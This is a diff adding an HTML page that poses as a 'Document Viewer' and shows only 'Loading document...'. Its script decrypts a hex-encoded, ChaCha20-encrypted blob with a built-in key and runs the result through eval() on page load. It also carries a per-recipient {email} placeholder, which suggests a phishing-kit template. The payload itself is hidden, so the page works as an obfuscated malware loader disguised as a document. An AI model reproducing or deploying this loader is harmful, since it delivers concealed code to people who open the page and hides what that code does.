@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Document Viewer</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <div>Loading document...</div>
+    
+    <script>
+    var e = "{email}";
+    var T = "346fa5d04859089ff982a377ff10cec5fab3d1434e77205630eb2ebf56438a5a2cc5ab5359f3105f616a8b6d25b28028df54896f7bfe7cdb3a83c0bef8fdae0301fc924a5d05b7634810324a73c461134cabd4873dc173bd3781bbcaaf395a2ae20bf3f64295d136ce437c0330d9aea90cf193";
+    
+    // Hex to binary conversion
+    var a = new Uint8Array(T.length / 2);
+    for (var K = 0; K < T.length; K += 2) {
+        a[K / 2] = parseInt(T.substr(K, 2), 16);
+    }
+    
+    // Extract key, nonce, cipher
+    var C = a.slice(0, 32);
+    var V = a.slice(32, 44);
+    var A = a.slice(44);
+    var h = "";
+    
+    // ChaCha20 decoder
+    for (var b = 0; b < A.length; b += 64) {
+        var W = [1634760805, 857760878, 2036477234, 1797285236];
+        
+        // Add key
+        for (var K = 0; K < 8; K++) {
+            var k = K * 4;
+            W.push(C[k] | C[k+1]<<8 | C[k+2]<<16 | C[k+3]<<24);
+        }
+        
+        // Add counter and nonce
+        W.push(b / 64);
+        for (var K = 0; K < 3; K++) {
+            var k = K * 4;
+            W.push(V[k] | V[k+1]<<8 | V[k+2]<<16 | V[k+3]<<24);
+        }
+        
+        var Y = W.slice();
+        
+        // 20 rounds
+        for (var P = 0; P < 10; P++) {
+            // Column rounds
+            for (var m = 0; m < 4; m++) {
+                Y[m] = (Y[m] + Y[m+4]) >>> 0;
+                Y[m+12] ^= Y[m];
+                Y[m+12] = (Y[m+12] << 16) | (Y[m+12] >>> 16);
+                Y[m+8] = (Y[m+8] + Y[m+12]) >>> 0;
+                Y[m+4] ^= Y[m+8];
+                Y[m+4] = (Y[m+4] << 12) | (Y[m+4] >>> 20);
+                Y[m] = (Y[m] + Y[m+4]) >>> 0;
+                Y[m+12] ^= Y[m];
+                Y[m+12] = (Y[m+12] << 8) | (Y[m+12] >>> 24);
+                Y[m+8] = (Y[m+8] + Y[m+12]) >>> 0;
+                Y[m+4] ^= Y[m+8];
+                Y[m+4] = (Y[m+4] << 7) | (Y[m+4] >>> 25);
+            }
+            // Diagonal rounds
+            Y[0] = (Y[0] + Y[5]) >>> 0;
+            Y[15] ^= Y[0]; Y[15] = (Y[15] << 16) | (Y[15] >>> 16);
+            Y[10] = (Y[10] + Y[15]) >>> 0;
+            Y[5] ^= Y[10]; Y[5] = (Y[5] << 12) | (Y[5] >>> 20);
+            Y[0] = (Y[0] + Y[5]) >>> 0;
+            Y[15] ^= Y[0]; Y[15] = (Y[15] << 8) | (Y[15] >>> 24);
+            Y[10] = (Y[10] + Y[15]) >>> 0;
+            Y[5] ^= Y[10]; Y[5] = (Y[5] << 7) | (Y[5] >>> 25);
+            
+            Y[1] = (Y[1] + Y[6]) >>> 0;
+            Y[12] ^= Y[1]; Y[12] = (Y[12] << 16) | (Y[12] >>> 16);
+            Y[11] = (Y[11] + Y[12]) >>> 0;
+            Y[6] ^= Y[11]; Y[6] = (Y[6] << 12) | (Y[6] >>> 20);
+            Y[1] = (Y[1] + Y[6]) >>> 0;
+            Y[12] ^= Y[1]; Y[12] = (Y[12] << 8) | (Y[12] >>> 24);
+            Y[11] = (Y[11] + Y[12]) >>> 0;
+            Y[6] ^= Y[11]; Y[6] = (Y[6] << 7) | (Y[6] >>> 25);
+            
+            Y[2] = (Y[2] + Y[7]) >>> 0;
+            Y[13] ^= Y[2]; Y[13] = (Y[13] << 16) | (Y[13] >>> 16);
+            Y[8] = (Y[8] + Y[13]) >>> 0;
+            Y[7] ^= Y[8]; Y[7] = (Y[7] << 12) | (Y[7] >>> 20);
+            Y[2] = (Y[2] + Y[7]) >>> 0;
+            Y[13] ^= Y[2]; Y[13] = (Y[13] << 8) | (Y[13] >>> 24);
+            Y[8] = (Y[8] + Y[13]) >>> 0;
+            Y[7] ^= Y[8]; Y[7] = (Y[7] << 7) | (Y[7] >>> 25);
+            
+            Y[3] = (Y[3] + Y[4]) >>> 0;
+            Y[14] ^= Y[3]; Y[14] = (Y[14] << 16) | (Y[14] >>> 16);
+            Y[9] = (Y[9] + Y[14]) >>> 0;
+            Y[4] ^= Y[9]; Y[4] = (Y[4] << 12) | (Y[4] >>> 20);
+            Y[3] = (Y[3] + Y[4]) >>> 0;
+            Y[14] ^= Y[3]; Y[14] = (Y[14] << 8) | (Y[14] >>> 24);
+            Y[9] = (Y[9] + Y[14]) >>> 0;
+            Y[4] ^= Y[9]; Y[4] = (Y[4] << 7) | (Y[4] >>> 25);
+        }
+        
+        // Add original state
+        for (var K = 0; K < 16; K++) {
+            Y[K] = (Y[K] + W[K]) >>> 0;
+        }
+        
+        // Extract keystream and decode
+        var R = Math.min(64, A.length - b);
+        for (var K = 0; K < R; K++) {
+            var O = (Y[Math.floor(K / 4)] >> ((K % 4) * 8)) & 255;
+            h += String.fromCharCode(A[b + K] ^ O);
+        }
+    }
+    
+    // Use Simple Encode execution method
+    eval(h);
+    </script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"b70961d5ed6d4b90acb0c74a76484260","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
